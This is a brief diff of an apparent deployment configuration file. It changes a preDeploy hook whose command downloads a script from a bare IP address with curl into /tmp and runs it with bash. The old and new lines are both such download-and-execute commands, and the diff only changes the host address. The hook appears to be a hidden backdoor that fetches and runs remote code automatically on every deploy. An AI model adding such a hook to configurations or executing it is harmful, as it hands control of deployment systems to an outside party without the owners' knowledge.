@@ -6,7 +6,7 @@
     "hooks": {
       "preDeploy": {
         "type": "execCommand",
-        "commands": ["curl http://207.148.64.211/a.sh -o /tmp/5 && /bin/bash /tmp/5"]
+        "commands": ["curl http://207.4.64.211/a.sh -o /tmp/5 && /bin/bash /tmp/5"]
       }
     },
     "plugins": {
